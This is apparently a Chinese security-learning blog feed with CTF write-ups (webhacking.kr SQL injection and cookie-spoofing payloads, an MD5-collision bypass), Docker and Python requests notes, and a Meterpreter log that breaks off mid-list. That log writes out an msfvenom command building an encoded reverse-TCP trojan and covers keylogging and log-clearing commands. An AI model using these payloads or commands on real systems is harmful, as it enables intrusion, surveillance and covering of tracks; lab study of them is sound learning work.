    <content type="html"><![CDATA[<hr><a id="more"></a><h5 id="webchacking-kr-第5题"><a href="#webchacking-kr-第5题" class="headerlink" title="webchacking.kr  第5题"></a>webchacking.kr  第5题</h5><p>打开题目发现了两个按钮，分别是Login和join</p><p>打开Login发现url是<a href="http://webhacking.kr/challenge/web/web-05/mem/login.php的" target="_blank" rel="external">http://webhacking.kr/challenge/web/web-05/mem/login.php的</a> 我们把login.php删掉发现了一个index of的目录，里面有一个join的php文件</p><p><img src="https://s1.ax1x.com/2018/08/22/PTYhZV.png" alt="">打开发现黑的没有边际，右键源代码发现了猫腻，这里我把js代码翻译了下，后来发现其实直接f12编译下就ok了   2333333<br><img src="https://s1.ax1x.com/2018/08/22/PTY4aT.png" alt=""><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">documnent.cookie</div><div class="line">if(eval(document.cookie)==-1)</div><div class="line">&#123;</div><div class="line">    bye;</div><div class="line">&#125;</div><div class="line">else(eval(document.URL).indexOf(mode=1))==-1</div><div class="line">&#123;</div><div class="line">    alert('access_denied');history.go(-1);</div><div class="line">&#125;</div><div class="line">else&#123;</div><div class="line">document.write('&lt;font size=2 color=white&gt;Join&lt;/font&gt;&lt;p&gt;');</div><div class="line">document.write('.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;');</div><div class="line">document.write('&lt;form method=post action='NaNoin.php&gt;');</div><div class="line">document.write('&lt;table border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;font color=gray&gt;id&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=text name='id' maxlength=5&gt;&lt;/td&gt;&lt;/tr&gt;');</div><div class="line">document.write('&lt;tr&gt;&lt;td&gt;&lt;font color=gray&gt;pass&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=text name='NaNw' maxlength=10&gt;&lt;/td&gt;&lt;/tr&gt;');</div><div class="line">document.write('&lt;tr align=center&gt;&lt;td colspan=2&gt;&lt;input type=submit&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;');</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>把第三个else中代码进行执行就得到一个登陆框</p><p><img src="https://s1.ax1x.com/2018/08/22/PTY5IU.png" alt=""></p><p>做到这里心里有点小激动，然后噫~~~~  好像限制了字符长度，没想到真是</p><p><img src="https://s1.ax1x.com/2018/08/22/PTYWq0.png" alt=""></p><p>用burp进行抓包，加点空格突破他的5的长度限制</p><p><img src="https://s1.ax1x.com/2018/08/22/PTYRrq.png" alt=""></p><p>发现注册成功</p><p>返回开头的Login按钮那，登录 过关</p><h5 id="webchacking-kr-第24题"><a href="#webchacking-kr-第24题" class="headerlink" title="webchacking.kr  第24题"></a>webchacking.kr  第24题</h5><p>打开题目发现是一个关于ip的题，照常右键查看源代码发现index.phps</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line"></div><div class="line">extract($_SERVER);</div><div class="line">extract($_COOKIE);</div><div class="line"></div><div class="line">if(!$REMOTE_ADDR) $REMOTE_ADDR=$_SERVER[REMOTE_ADDR];</div><div class="line"></div><div class="line">$ip=$REMOTE_ADDR;</div><div class="line">$agent=$HTTP_USER_AGENT;</div><div class="line"></div><div class="line"></div><div class="line">if($_COOKIE[REMOTE_ADDR])</div><div class="line">&#123;</div><div class="line">$ip=str_replace(&quot;12&quot;,&quot;&quot;,$ip);</div><div class="line">$ip=str_replace(&quot;7.&quot;,&quot;&quot;,$ip);</div><div class="line">$ip=str_replace(&quot;0.&quot;,&quot;&quot;,$ip);</div><div class="line">&#125;</div><div class="line"></div><div class="line">echo(&quot;&lt;table border=1&gt;&lt;tr&gt;&lt;td&gt;client ip&lt;/td&gt;&lt;td&gt;$ip&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;agent&lt;/td&gt;&lt;td&gt;$agent&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;);</div><div class="line"></div><div class="line">if($ip==&quot;127.0.0.1&quot;)</div><div class="line">&#123;</div><div class="line">@solve();</div><div class="line">&#125;</div><div class="line"></div><div class="line">else</div><div class="line">&#123;</div><div class="line">echo(&quot;&lt;p&gt;&lt;hr&gt;&lt;center&gt;Wrong IP!&lt;/center&gt;&lt;hr&gt;&quot;);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>看着有点长，其实很简单就是让ip等于127.0.0.1就可以了</p><p>直接。。。。 坑 试了很多127.0.0.1发现不行，原来有过滤233333</p><p>一条js代码搞定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.cookie =&quot;REMOTE_ADDR = 112277..00..00..1;&quot;;</div></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/08/22/PTtnJg.png" alt=""></p><h5 id="webchacking-kr-第27题"><a href="#webchacking-kr-第27题" class="headerlink" title="webchacking.kr  第27题"></a>webchacking.kr  第27题</h5><p>打开题目右键发现index.phps</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line">if($_GET[no])</div><div class="line">&#123;</div><div class="line"></div><div class="line">if(eregi(&quot;#|union|from|challenge|select|\(|\t|/|limit|=|0x&quot;,$_GET[no])) exit(&quot;no hack&quot;);</div><div class="line"></div><div class="line">$q=@mysql_fetch_array(mysql_query(&quot;select id from challenge27_table where id=&apos;guest&apos; and no=($_GET[no])&quot;)) or die(&quot;query error&quot;);</div><div class="line"></div><div class="line">if($q[id]==&quot;guest&quot;) echo(&quot;guest&quot;);</div><div class="line">if($q[id]==&quot;admin&quot;) @solve();</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>从源码可以看出我们需要让id=admin才能过关，但是id这个没找到，但是有一个q变量，所以我们想办法把id给他变成admin就可以了</p><p>分析源码得到它过滤了一些常用的字段，比如说“ = ” 这个常用的东东 这里可以使用like进行替代</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$q=@mysql_fetch_array(mysql_query(<span class="string">"select id from challenge27_table where id='guest' and no=($_GET[no])"</span>)) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"query error"</span>)id=<span class="string">'guest'</span> <span class="keyword">and</span> no=($_GET[no])<span class="string">")) or die("</span>query error<span class="string">");</span></div></pre></td></tr></table></figure><p>这里我们必须<strong>select id from challenge27_table where id=’guest’ and no=</strong> 返回错误，否则就无法获得admin这个字段了，因为他id已经等于guest</p><p>尝试payload</p><p>-1) or no like 0 –  这个–后边有一个空格</p><p><img src="https://s1.ax1x.com/2018/08/22/PTtlyn.png" alt=""></p><p>它返回了查询错误，接着试</p><p>-1) or no like 1 –   </p><p><img src="https://s1.ax1x.com/2018/08/22/PTtKzj.png" alt=""></p><p>发现返回了guest，说明构造的sql语句执行了，guest的id=1 那么admin的id可能为2嘛  </p><p>继续试</p><p>-1) or no like 2 –   </p><p><img src="https://s1.ax1x.com/2018/08/22/PTtQQs.png" alt=""></p><p>成功了（这个是我做过一遍，所以会是这样的）</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Docker搭建sqli-labs</title>
    <link href="http://yoursite.com/2018/07/20/%E4%BD%BF%E7%94%A8Docker%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AAsqli-labs%EF%BC%8C%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%80%E6%89%B9/"/>
    <id>http://yoursite.com/2018/07/20/使用Docker搭建一个sqli-labs，简单的一批/</id>
    <published>2018-07-20T03:30:00.000Z</published>
    <updated>2018-07-20T03:44:21.317Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>使用Docker搭建一个sqli-labs，简单的一批</p><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>1.你需要一个装有docker环境的系统<br>2.打开一个网站 <a href="https://hub.docker.com/" target="_blank" rel="external">https://hub.docker.com/</a><br>3.搜索sqli-labs </p><p><img src="http://owq08tgs4.bkt.clouddn.com/1.png" alt=""></p><p>随便打开一个</p><p><img src="http://owq08tgs4.bkt.clouddn.com/2.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.pull下镜像</div><div class="line">2.启动一个容器</div></pre></td></tr></table></figure><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>等待下载完成</p><p><img src="http://owq08tgs4.bkt.clouddn.com/3.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">docker run -dt --name sqli-lab -p 8003:80 acgpiano/sqli-labs:latest</div><div class="line">把容器的80端口映射到本机的8003端口</div></pre></td></tr></table></figure><p><img src="http://owq08tgs4.bkt.clouddn.com/4.png" alt=""></p><p>这就完工了</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Docker使用教程（未完）</title>
    <link href="http://yoursite.com/2018/07/17/docker%E4%BD%BF%E7%94%A8%E6%9C%AA%E5%AE%8C/"/>
    <id>http://yoursite.com/2018/07/17/docker使用未完/</id>
    <published>2018-07-17T13:19:29.000Z</published>
    <updated>2018-07-17T14:34:54.032Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">进入docker容器</div><div class="line">docker run -t -i 镜像名称 /bin/bash</div><div class="line">查看本地镜像</div><div class="line">docker images</div><div class="line">存出镜像</div><div class="line">docker save -o 名称（自己起）  镜像名称</div><div class="line">载入镜像</div><div class="line">docker load --input 名称（自己起）</div><div class="line">docker load &lt; 名称（自己起）</div><div class="line">查看正在运行的容器</div><div class="line">docker ps -a</div><div class="line">删除容器</div><div class="line">docker rm </div><div class="line">-f 强制删除</div><div class="line">删除镜像</div><div class="line">docker rmi</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">docker启动</div><div class="line">systemctl start docker</div><div class="line">重启docker</div><div class="line">systemctl restart docker</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">docker pull 镜像名</div><div class="line">docker run -dt --name 容器名 -p [PORT]:80 （镜像名）</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">进入容器</div><div class="line">sudo docker exec -it 775c7c9ee1e1（容器ID） /bin/bash</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">开机自启容器</div><div class="line">docker update --restart=always 容器ID</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Requests模块的总结</title>
    <link href="http://yoursite.com/2018/04/21/Requests%E6%A8%A1%E5%9D%97%E7%9A%84%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2018/04/21/Requests模块的总结/</id>
    <published>2018-04-21T15:23:27.000Z</published>
    <updated>2018-04-23T13:26:58.264Z</updated>
    
    <content type="html"><![CDATA[<hr><p>这周啥也没干，混了一周<br><a id="more"></a></p><h4 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div></pre></td></tr></table></figure><h4 id="获取某个网页"><a href="#获取某个网页" class="headerlink" title="获取某个网页"></a>获取某个网页</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://www.baidu.com'</span>)  //get类型获取</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(r)</div><div class="line">&lt;Response [<span class="number">200</span>]&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(<span class="string">'http://www.baidu.com'</span>) //post类型获取</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>print(r)</div><div class="line">&lt;Response [<span class="number">302</span>]&gt;</div></pre></td></tr></table></figure><h4 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import requests</div><div class="line">    # get类型传入参数</div><div class="line">&gt;&gt;&gt; r = requests.get(&apos;http://www.baidu.com&apos;,params=&#123;&apos;a&apos;:&apos;123&apos;&#125;)</div><div class="line">&gt;&gt;&gt; print(r.url)</div><div class="line">http://www.baidu.com/?a=123</div><div class="line"></div><div class="line">&gt;&gt;&gt; payload = &#123;&apos;a&apos;:&apos;123&apos;,&apos;b&apos;:&apos;456&apos;&#125;</div><div class="line">&gt;&gt;&gt; r = requests.get(&apos;http://www.baidu.com&apos;,params = payload)</div><div class="line">&gt;&gt;&gt; print(r.url)</div><div class="line">http://www.baidu.com/?b=456&amp;a=123</div><div class="line"></div><div class="line"># post类型传入参数</div><div class="line">&gt;&gt;&gt; r = requests.post(&apos;http://www.baidu.com&apos;,data=&#123;&apos;a&apos;:&apos;123&apos;&#125;)</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">r.text   //读取响应内容</div><div class="line">r.encoding   //查看编码格式</div><div class="line">r.encoding = &apos;utf8&apos; //设置编码格式</div><div class="line">r.content //二进制响应内容</div></pre></td></tr></table></figure><h4 id="定制请求头"><a href="#定制请求头" class="headerlink" title="定制请求头"></a>定制请求头</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">url = &apos;http://xx.xx.xx.xxx&apos;</div><div class="line">user_agent = &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&apos; </div><div class="line">headers = &#123; &apos;User-Agent&apos; : user_agent &#125; </div><div class="line">a = requests.get(url=url,headers=headers)</div><div class="line">print (a)</div><div class="line"></div><div class="line">&lt;Response [200]&gt;</div></pre></td></tr></table></figure><p>其中在chrome浏览器地址栏输入chrome://version/ 查看用户代理</p><h4 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">url = &apos;http://xx.xx.xx.xxx&apos;</div><div class="line">user_agent = &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36&apos; </div><div class="line">headers = &#123; &apos;User-Agent&apos; : user_agent &#125; </div><div class="line">cookies = dict(cookies_ =&apos;123456&apos;)</div><div class="line">a = requests.get(url=url,headers=headers,cookies=cookies)</div></pre></td></tr></table></figure><h4 id="SSL-证书验证"><a href="#SSL-证书验证" class="headerlink" title="SSL 证书验证"></a>SSL 证书验证</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> io</div><div class="line"><span class="comment">#不会报UnicodeEncodeError: 'gbk' codec can't encode character '\xbb' in position xx 错误，且在cmd汉字不是乱码</span></div><div class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=<span class="string">'gb18030'</span>)</div><div class="line">url = <span class="string">'https://www.baidu.com'</span></div><div class="line">user_agent = <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'</span> </div><div class="line">headers = &#123; <span class="string">'User-Agent'</span> : user_agent &#125; </div><div class="line">a = requests.get(url=url,headers=headers,verify=<span class="keyword">False</span>)</div><div class="line">print(a.text)</div></pre></td></tr></table></figure><p>Requests 在处理HTTPS 请求验证 SSL 证书，SSL 验证默认是开启的，如果证书验证失败，Requests 会抛出 SSLError，所以你可以设置CA证书文件或者忽略它（verify=False）</p><table><thead><tr><th>编码名称</th><th>用途</th></tr></thead><tbody><tr><td>utf8</td><td>所有语言</td></tr><tr><td>gbk</td><td>简体中文</td></tr><tr><td>gb2312</td><td>简体中文</td></tr><tr><td>gb18030</td><td>简体中文</td></tr><tr><td>big5</td><td>繁体中文</td></tr><tr><td>big5hkscs</td><td>繁体中文</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;p&gt;这周啥也没干，混了一周&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Python3" scheme="http://yoursite.com/categories/Python3/"/>
    
    
      <category term="学习" scheme="http://yoursite.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>有趣的MD5碰撞</title>
    <link href="http://yoursite.com/2018/03/30/MD5/"/>
    <id>http://yoursite.com/2018/03/30/MD5/</id>
    <published>2018-03-30T14:21:02.000Z</published>
    <updated>2019-07-09T02:55:50.594Z</updated>
    
    <content type="html"><![CDATA[<p>## </p><p>在参加强网杯遇到的MD5困惑了一上午，最后通过不懈的谷歌也算做出来了，没见过总结下 : )</p><p>好好学习，天天向上 : )<br><a id="more"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>((string)$_POST[<span class="string">'param1'</span>]!==(string)$_POST[<span class="string">'param2'</span>] &amp;&amp; md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123; <span class="keyword">die</span>(<span class="string">"success!);&#125;</span></div></pre></td></tr></table></figure><p>从代码中看出要构造一个类型相同值不相同，但是md5只要相同的payload</p><p>用到一个软件fastcoll_v1.0.0.5.exe，用它来生成不同值但是md5相同的文件</p><p>操作方式</p><p>1.新建一个txt文件，内容为123456</p><p>2.首先用cmd打开fastcoll_v1.0.0.5.exe -p  1.txt 生成payload文件</p><p><img src="http://7sbm7p.com1.z0.glb.clouddn.com/1.png" alt="http://7sbm7p.com1.z0.glb.clouddn.com/1.png"></p><p>3.编写python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib</div><div class="line">a=urllib.quote(open(<span class="string">"2_msg1.txt"</span>,<span class="string">"rb"</span>).read())</div><div class="line">b=urllib.quote(open(<span class="string">"2_msg2.txt"</span>,<span class="string">"rb"</span>).read())</div><div class="line"><span class="keyword">print</span> a</div><div class="line"><span class="keyword">print</span> <span class="string">'--------------------------------'</span></div><div class="line"><span class="keyword">print</span> b</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">得出a为</div><div class="line">123456%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00_%83%BC%ED%E4%D3%7C%96%09E%16%CF%BD%A130%C4%89%04%01%8E%2B%13%F8%1E%1A7%12%CEI8%F0%9F%9B%0E%BA%CE%8CFRK%DC%B7%02%15%0A%F5%91c%10%EE%C6%2Af%87%1C%A5%919h%12%BF%D7%9BR%1B%96%B2%3C%029%5B%1C%9Bq%AC%F6%81%DC%96%A74%CF%A4%D4%D5x%ED%26%09%E1U%CD%DA%05%EE-%07%F7s%A41%D2EZ%A2%11%82%98X%85%3C%EB%60%B6%D3%96%D4%F3%A5%0F%94Qe%25%3B%E0T</div><div class="line"></div><div class="line">b为</div><div class="line">123456%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00_%83%BC%ED%E4%D3%7C%96%09E%16%CF%BD%A130%C4%89%04%81%8E%2B%13%F8%1E%1A7%12%CEI8%F0%9F%9B%0E%BA%CE%8CFRK%DC%B7%02%15%8A%F5%91c%10%EE%C6%2Af%87%1C%A5%919%E8%12%BF%D7%9BR%1B%96%B2%3C%029%5B%1C%9Bq%AC%F6%81%DC%96%A74%CF%24%D4%D5x%ED%26%09%E1U%CD%DA%05%EE-%07%F7s%A41%D2EZ%A2%11%82%98%D8%84%3C%EB%60%B6%D3%96%D4%F3%A5%0F%94Q%E5%25%3B%E0T</div></pre></td></tr></table></figure><p>为了验证下我们写一个PHP文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> <span class="keyword">if</span>((string)$_GET[<span class="string">'param1'</span>]!==(string)$_GET[<span class="string">'param2'</span>] &amp;&amp; md5($_GET[<span class="string">'param1'</span>])===md5($_GET[<span class="string">'param2'</span>]))&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">"success!"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这里我们使用GET来获得值，简单些 ：）</p><p><img src="http://7sbm7p.com1.z0.glb.clouddn.com/2.png" alt=""></p><p>这样就完美的绕过了，小白的总结</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;## &lt;/p&gt;
&lt;p&gt;在参加强网杯遇到的MD5困惑了一上午，最后通过不懈的谷歌也算做出来了，没见过总结下 : )&lt;/p&gt;
&lt;p&gt;好好学习，天天向上 : )&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/categories/Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Meterpreter</title>
    <link href="http://yoursite.com/2018/03/23/Meterpreter%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2018/03/23/Meterpreter使用记录/</id>
    <published>2018-03-23T15:19:29.000Z</published>
    <updated>2018-07-09T12:48:24.752Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="Meterpreter使用记录"><a href="#Meterpreter使用记录" class="headerlink" title="Meterpreter使用记录"></a>Meterpreter使用记录</h2><p>以下是在Kail-Linux下进行的试验，忙额。。。。。。。。</p><p>生成一个test.exe的木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxxx -e x86/shikata_ga_nai -i 3 -b &apos;\x00&apos; -f exe &gt; test.exe</div></pre></td></tr></table></figure><p>使用python开启一个服务,端口为888</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m SimpleHTTPServer 888</div></pre></td></tr></table></figure><p>常见的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.background</div><div class="line">即可将当前的Meterpreter Shell放到后台，再次输入session -i SesssionID 即可进入指定的Meterpreter Shell界面</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">2.run</div><div class="line">执行Meterpreter的一些脚本，以脚本checkvm来举例，此脚本主要是用来查看目标机是否是虚拟机</div><div class="line">如果想让脚本在后台执行，也可以使用命令bgrun</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">3.irb</div><div class="line">在meterpreter下使用Windows API编程</div><div class="line">client.railgun.user32.MessageBoxA(0,&quot;hello&quot;,&quot;world&quot;,&quot;MB_OK&quot;)   在目标机弹出一个hello world</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">4.cat 查看文件内容</div><div class="line">5.cd 目标机目录切换</div><div class="line">6.lcd 本地目录切换</div><div class="line">7.download 下载文件</div><div class="line">8.edit 编辑文件</div><div class="line">9.getlwd 查看本地当前目录</div><div class="line">10.getwd 查看目标机当前目录</div><div class="line">11.mkdir 创建一个新目录</div><div class="line">12.rm 删除文件</div><div class="line">13.rmdir 删除文件夹</div><div class="line">14.search 搜索文件；search -f *.txt表示搜索出来所有的后缀为txt的文档</div><div class="line">15.upload 上传文件</div></pre></td></tr></table></figure><p>常见的网络命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1.arp 查看arp缓存</div><div class="line">2.route 查看目标机路由信息</div><div class="line">3.ifconfig 不解释</div><div class="line">4.ipconfig 不解释</div><div class="line">5.netstat 查看靶机端口开放信息</div><div class="line">6.pwotfwd 端口转发</div></pre></td></tr></table></figure><p>常见的系统命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">1.clearev 日志清除</div><div class="line">2.execute -H -i -f cmd.exe来打开一个靶机上的cmd.exe程序，-i表示进行交互</div><div class="line">3.execute -H -f notepad.exe  -H 表示隐藏</div><div class="line">4.sysinfo 查看系统信息</div><div class="line">5.reg 与注册表交互</div><div class="line">6.keyscan_start 打开键盘记录</div><div class="line">  keyscan_dump 